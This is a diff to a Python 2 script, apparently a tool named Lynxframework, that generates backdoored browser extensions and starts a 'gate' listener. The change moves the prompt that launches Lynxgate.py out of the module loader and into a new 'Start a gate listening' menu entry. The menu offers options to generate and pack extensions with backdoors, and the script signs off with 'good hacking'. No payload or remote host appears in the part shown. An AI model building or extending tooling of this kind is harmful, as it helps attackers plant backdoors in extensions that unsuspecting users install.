@@ -40,14 +40,8 @@ def load_module(backdoor_name):
 						line = line.replace("//MODULE//", load_module_content)
 					load_check.write(line)
 				print '[+] Module writed! '
-				user_input = raw_input("[+] Start gate? [Y/n]")
-				if user_input == '' or user_input == 'Y' or user_input == 'y':
-					if os.path.isfile('Lynxgate.py'):
-						os.system('python Lynxgate.py')
-					else:
-						print "[!] Gate not found."
-				print "[~] Bye, & good hacking."
 				action = 1
+				print "[~] Bye, & good hacking."
 
 def making(information_array):
 	output_name = raw_input('Output Name : ')
@@ -132,13 +126,20 @@ def generate_backdoor():
 	elif user_input == 'f' or user_input == 'F':
 		backdooring('F')
 
+def gate_listing():
+	if os.path.isfile('Lynxgate.py'):
+		os.system('python Lynxgate.py')
+
 def menu():
 	print "-> [G]enerate a extension backdoored."
+	print "-> [S]tart a gate listening."
 	print "-> [L]oad a lframework module."
 	print "-> [C]ompact extension with backdoor."
 	user_input = raw_input('\nLynxframework > ')
 	if user_input == 'g' or user_input == 'G':
 		generate_backdoor()
+	elif user_input == 's' or user_input == 'S':
+		gate_listing()
 
 def main():
 	logo = """
